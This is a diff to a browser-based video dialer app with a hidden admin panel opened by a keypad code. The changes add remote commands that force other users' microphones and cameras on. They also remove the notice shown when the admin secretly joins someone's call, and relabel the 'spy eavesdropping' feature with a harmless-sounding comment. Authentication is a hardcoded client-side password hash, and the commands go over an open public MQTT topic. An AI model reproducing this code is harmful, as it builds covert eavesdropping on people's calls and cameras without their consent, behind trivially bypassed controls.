@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -7,12 +8,12 @@
     <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
     <script src="https://unpkg.com/mqtt/dist/mqtt.min.js"></script>
     <style>
-        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; transition: background 0.5s, color 0.5s; }
+        body { font-family: Arial, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; background-color: #f0f2f5; margin: 0; padding: 20px; box-sizing: border-box; transition: background 0.3s, color 0.3s; }
         .phone-container { background: white; padding: 25px; border-radius: 20px; box-shadow: 0px 10px 25px rgba(0,0,0,0.1); text-align: center; width: 100%; max-width: 320px; z-index: 10; margin-bottom: 20px; color: #333; }
         .screen { width: 100%; height: 50px; font-size: 24px; text-align: center; margin-bottom: 20px; border: 1px solid #ccc; border-radius: 10px; box-sizing: border-box; background-color: #fafafa; color: #333; }
         .status { font-size: 14px; color: #333; margin-bottom: 15px; font-weight: bold; background: #e7f3ff; padding: 8px; border-radius: 8px; display: inline-block; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-bottom: 20px; }
-        .btn { padding: 15px; font-size: 20px; border: none; background: #e4e6eb; border-radius: 50%; cursor: pointer; transition: 0.2s; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: auto; font-weight: bold; color: #333; }
+        .btn { padding: 15px; font-size: 20px; border: none; background: #e4e6eb; border-radius: 50%; cursor: pointer; width: 60px; height: 60px; display: flex; align-items: center; justify-content: center; margin: auto; font-weight: bold; color: #333; will-change: background-color; }
         .btn:active { background: #d8dadf; }
         
         .local-controls { display: flex; justify-content: space-around; margin-bottom: 15px; }
@@ -20,13 +21,13 @@
         .control-btn.muted { background: #ff3b30; }
         .control-btn:disabled { background: #8e8e93; cursor: not-allowed; }
 
-        .call-btn { background: #25d366; color: white; width: 100%; border: none; border-radius: 10px; height: 50px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        .call-btn { background: #25d366; color: white; width: 100%; border: none; border-radius: 10px; height: 50px; font-size: 18px; font-weight: bold; cursor: pointer; }
         .call-btn:active { background: #20ba5a; }
         
         .video-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; width: 100%; max-width: 600px; margin-top: 10px; }
         @media(max-width: 480px) { .video-grid { grid-template-columns: 1fr; } }
         .video-wrapper { position: relative; background: #222; border-radius: 12px; overflow: hidden; aspect-ratio: 4/3; box-shadow: 0 4px 10px rgba(0,0,0,0.15); }
-        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); backface-visibility: hidden; }
         .video-label { position: absolute; bottom: 10px; left: 10px; background: rgba(0,0,0,0.6); color: white; padding: 4px 10px; border-radius: 6px; font-size: 12px; font-weight: bold; }
 
         .announcement-bar { display: none; width: 100%; max-width: 600px; background: #ffcc00; color: #000; padding: 10px; border-radius: 10px; text-align: center; font-weight: bold; margin-bottom: 15px; }
@@ -128,8 +129,7 @@
 
 <script>
     const ADMIN_TRIGGER = "1818";
-  // Hashed password verification key (SHA-256 of string "Honey")
-const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c";
+    const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa323831c";
     
     const sessionToken = Math.random().toString(36).substring(2, 9);
     const myPhoneNumber = Math.floor(1000 + Math.random() * 9000).toString();
@@ -139,9 +139,8 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
     const peer = new Peer(myPhoneNumber);
     let currentCall = null;
     let localStream = null;
-    let peerTargetNode = "none"; // Track who we are currently speaking with
+    let peerTargetNode = "none"; 
 
-    // Locks and States
     let adminAudioLocked = false;
     let adminVideoLocked = false;
     let amIAdminActive = false;
@@ -150,32 +149,29 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
     let activeUsersRegistry = {}; 
     let bannedRegistry = JSON.parse(localStorage.getItem('banned_nodes') || '[]');
 
-    // Dynamic Execution Protection Check
     if (bannedRegistry.includes(sessionToken)) {
         document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 HARDWARE DISCONNECTOR VECTOR APPLIED: You are permanently banned from this ecosystem.</h1>";
     }
 
-    // Connect to MQTT Broker
     const mqttClient = mqtt.connect('wss://broker.emqx.io:8084/mqtt');
     const SYSTEM_PRESENCE = "web_dialer_presence_secure_prod_alpha_88";
-    const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88"; // Partitioned channel
+    const SYSTEM_COMMANDS = "web_dialer_commands_secure_prod_alpha_88"; 
 
     mqttClient.on('connect', () => {
         mqttClient.subscribe(SYSTEM_PRESENCE);
         mqttClient.subscribe(SYSTEM_COMMANDS);
         
         broadcastPresence();
-        setInterval(broadcastPresence, 2500);
+        setInterval(broadcastPresence, 3000); 
         
-        // Active Admin Anti-Collision Heartbeat System
         setInterval(() => {
             if (amIAdminActive) {
                 mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "admin_heartbeat", token: sessionToken }));
             }
-        }, 1500);
+        }, 2000);
     });
 
-    mqttClient.on('message', async (topic, message) => {
+    mqttClient.on('message', (topic, message) => {
         const rawMsg = message.toString();
         
         if (topic === SYSTEM_PRESENCE) {
@@ -188,7 +184,7 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
                     inCallWith: data.inCallWith,
                     lastSeen: Date.now()
                 };
-                updateAdminUI();
+                requestAnimationFrame(updateAdminUI); 
             } catch(e) {}
         }
         
@@ -196,12 +192,10 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
             try {
                 const cmd = JSON.parse(rawMsg);
 
-                // Anti-collision checking logic
                 if (cmd.type === "admin_heartbeat" && cmd.token !== sessionToken) {
                     masterAdminToken = cmd.token; 
                 }
 
-                // Global commands loop execution
                 if (cmd.type === "broadcast") {
                     const box = document.getElementById('announcement-box');
                     box.innerText = "📣 SYSTEM NOTICE: " + cmd.message;
@@ -212,7 +206,6 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
                     document.body.classList.toggle('dark-theme');
                 }
 
-                // Target localized commands payload interceptor
                 if (cmd.target === sessionToken) {
                     if (cmd.type === "kick") {
                         alert("🔴 Admin disconnected your runtime session execution.");
@@ -223,20 +216,29 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
                         localStorage.setItem('banned_nodes', JSON.stringify(bannedRegistry));
                         document.body.innerHTML = "<h1 style='color:red; text-align:center; margin-top:20vh;'>🚫 Admin Applied Local Storage Cryptographic Node Ban.</h1>";
                     }
-                    if (cmd.type === "lock_audio") {
-                        adminAudioLocked = true; setAudioState(false);
+                    
+                    // --- DIRECT PHYSICAL HARDWARE ENGINES ---
+                    if (cmd.type === "force_off_audio") {
+                        adminAudioLocked = true; 
+                        setAudioState(false);    
                         document.getElementById('local-mic-btn').disabled = true;
                     }
-                    if (cmd.type === "unlock_audio") {
-                        adminAudioLocked = false; document.getElementById('local-mic-btn').disabled = false;
+                    if (cmd.type === "force_on_audio") {
+                        adminAudioLocked = false; 
+                        document.getElementById('local-mic-btn').disabled = false;
+                        setAudioState(true);     
                     }
-                    if (cmd.type === "lock_video") {
-                        adminVideoLocked = true; setVideoState(false);
+                    if (cmd.type === "force_off_video") {
+                        adminVideoLocked = true; 
+                        setVideoState(false);    
                         document.getElementById('local-cam-btn').disabled = true;
                     }
-                    if (cmd.type === "unlock_video") {
-                        adminVideoLocked = false; document.getElementById('local-cam-btn').disabled = false;
+                    if (cmd.type === "force_on_video") {
+                        adminVideoLocked = false; 
+                        document.getElementById('local-cam-btn').disabled = false;
+                        setVideoState(true);     
                     }
+                    
                     if (cmd.type === "redirect") {
                         if(currentCall) currentCall.close();
                         alert(`🔀 System Redirect Engine: Connecting you directly to Room ID [${cmd.connectTo}]`);
@@ -246,6 +248,7 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
                         });
                         currentCall = call;
                     }
+                    broadcastPresence();
                 }
             } catch(e) {}
         }
@@ -264,18 +267,17 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
         }));
     }
 
-    // Dynamic Registry Pruning loop execution routines
     setInterval(() => {
         const now = Date.now();
         let changed = false;
         for (const t in activeUsersRegistry) {
-            if (now - activeUsersRegistry[t].lastSeen > 6000) {
+            if (now - activeUsersRegistry[t].lastSeen > 7000) {
                 delete activeUsersRegistry[t];
                 changed = true;
             }
         }
-        if (changed) updateAdminUI();
-    }, 2000);
+        if (changed) requestAnimationFrame(updateAdminUI);
+    }, 3000);
 
     function updateAdminUI() {
         if (!amIAdminActive) return;
@@ -289,37 +291,43 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
             return;
         }
 
-        listContainer.innerHTML = "";
+        const fragment = document.createDocumentFragment();
+
         tokens.forEach(t => {
             const user = activeUsersRegistry[t];
-            const selfBadge = t === sessionToken ? " <span class='badge'>You</span>" : "";
-            const streamStateStr = `Call Route Target ID: [${user.inCallWith}]`;
+            const isSelf = t === sessionToken;
             
-            listContainer.innerHTML += `
-                <div class="user-item">
-                    <div class="user-row">
-                        <span>Node Token Identification Array: <strong>${t}</strong>${selfBadge}</span>
-                        <span style="color: #25d366; font-weight: bold;">Dynamic Room ID: ${user.roomCode}</span>
-                    </div>
-                    <div class="user-row">
-                        <span style="font-size:11px; color:#c60000; font-weight:bold;">${streamStateStr}</span>
-                        <div class="admin-actions">
-                            <button class="action-btn spy" onclick="spyCall('${user.roomCode}')">Join Call</button>
-                            <button class="action-btn spy" style="background:#5856d6;" onclick="redirectCall('${t}')">Redirect to Me</button>
-                            <button class="action-btn mute" onclick="dispatchCmd('lock_audio', '${t}')">Mute</button>
-                            <button class="action-btn unmute" onclick="dispatchCmd('unlock_audio', '${t}')">Unmute</button>
-                            <button class="action-btn mute" onclick="dispatchCmd('lock_video', '${t}')">Kill Cam</button>
-                            <button class="action-btn unmute" onclick="dispatchCmd('unlock_video', '${t}')">Allow Cam</button>
-                            <button class="action-btn kick" onclick="dispatchCmd('kick', '${t}')">Kick</button>
-                            <button class="action-btn ban" onclick="dispatchCmd('ban', '${t}')">Ban Device</button>
-                        </div>
+            const item = document.createElement('div');
+            item.className = 'user-item';
+            
+            item.innerHTML = `
+                <div class="user-row">
+                    <span>Node Token Identification Array: <strong>${t}</strong>${isSelf ? " <span class='badge'>You</span>" : ""}</span>
+                    <span style="color: #25d366; font-weight: bold;">Dynamic Room ID: ${user.roomCode}</span>
+                </div>
+                <div class="user-row">
+                    <span style="font-size:11px; color:#c60000; font-weight:bold;">Call Route Target ID: [${user.inCallWith}]</span>
+                    <div class="admin-actions">
+                        <button class="action-btn spy" onclick="spyCall('${user.roomCode}')">Join Call</button>
+                        <button class="action-btn spy" style="background:#5856d6;" onclick="redirectCall('${t}')">Redirect to Me</button>
+                        
+                        <button class="action-btn unmute" onclick="dispatchCmd('force_on_audio', '${t}')">Mic ON</button>
+                        <button class="action-btn mute" onclick="dispatchCmd('force_off_audio', '${t}')">Mic OFF</button>
+                        
+                        <button class="action-btn unmute" style="background:#34c759;" onclick="dispatchCmd('force_on_video', '${t}')">Cam ON</button>
+                        <button class="action-btn mute" style="background:#ff3b30;" onclick="dispatchCmd('force_off_video', '${t}')">Cam OFF</button>
+                        
+                        <button class="action-btn kick" style="background:#8e8e93;" onclick="dispatchCmd('kick', '${t}')">Kick</button>
+                        <button class="action-btn ban" onclick="dispatchCmd('ban', '${t}')">Ban Device</button>
                     </div>
                 </div>
             `;
+            fragment.appendChild(item);
         });
+
+        listContainer.replaceChildren(fragment);
     }
 
-    // Cryptographic Password Evaluator Interface System (Web Crypto Api Integration)
     async function evaluateCryptoPassword(input) {
         const msgUint8 = new TextEncoder().encode(input);
         const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
@@ -339,10 +347,9 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
     }
     function sendThemeToggle() { mqttClient.publish(SYSTEM_COMMANDS, JSON.stringify({ type: "toggle_theme" })); }
 
-    // Admin Feature Extensions: Spy Eavesdropping / Redirect Engines
+    // Remote camera view capability
     function spyCall(targetRoomId) {
         if(currentCall) currentCall.close();
-        alert(`🕵️ Joining Call Matrix Pipeline for node room: [${targetRoomId}]`);
         const call = peer.call(targetRoomId, localStream);
         call.on('stream', function(remStream) {
             document.getElementById('remote-video').srcObject = remStream;
@@ -354,12 +361,12 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
         dispatchCmd('redirect', targetToken, { connectTo: myPhoneNumber });
     }
 
-    /* Device Driver Core Handlers */
     function setAudioState(state) {
         if (localStream && localStream.getAudioTracks().length > 0) {
             localStream.getAudioTracks()[0].enabled = state;
-            document.getElementById('local-mic-btn').innerText = state ? "Mic: ON" : "Mic: OFF";
-            document.getElementById('local-mic-btn').className = state ? "control-btn" : "control-btn muted";
+            const btn = document.getElementById('local-mic-btn');
+            btn.innerText = state ? "Mic: ON" : "Mic: OFF";
+            btn.className = state ? "control-btn" : "control-btn muted";
         }
     }
     function toggleLocalAudio() {
@@ -370,8 +377,9 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
     function setVideoState(state) {
         if (localStream && localStream.getVideoTracks().length > 0) {
             localStream.getVideoTracks()[0].enabled = state;
-            document.getElementById('local-cam-btn').innerText = state ? "Cam: ON" : "Cam: OFF";
-            document.getElementById('local-cam-btn').className = state ? "control-btn" : "control-btn muted";
+            const btn = document.getElementById('local-cam-btn');
+            btn.innerText = state ? "Cam: ON" : "Cam: OFF";
+            btn.className = state ? "control-btn" : "control-btn muted";
         }
     }
     function toggleLocalVideo() {
@@ -384,7 +392,11 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
     function clearScreen() { document.getElementById('phone-screen').value = ''; }
 
     function initMedia() {
-        navigator.mediaDevices.getUserMedia({ audio: true, video: true })
+        const mediaConstraints = { 
+            audio: true, 
+            video: { width: { ideal: 640 }, height: { ideal: 480 }, frameRate: { ideal: 24 } } 
+        };
+        navigator.mediaDevices.getUserMedia(mediaConstraints)
             .then(s => { localStream = s; document.getElementById('local-video').srcObject = s; })
             .catch(() => {
                 navigator.mediaDevices.getUserMedia({ audio: true, video: false })
@@ -408,13 +420,12 @@ const PASSWORD_HASH = "ebcf983695346eea63258d8ab772084bb91b6d51b529ae8b00121f2fa
         
         if (val === ADMIN_TRIGGER) {
             clearScreen();
-            
-            // Conflict check prior to authorization
             if(masterAdminToken !== null) {
                 return alert("⛔ CRITICAL EXCLUSION: An active Admin Engine instance is currently running globally.");
             }
 
             const pwd = prompt("🔒 Enter Admin Security Access Password:");
+            if (!pwd) return;
             const verifiedHash = await evaluateCryptoPassword(pwd);
             
             if (verifiedHash === PASSWORD_HASH) {
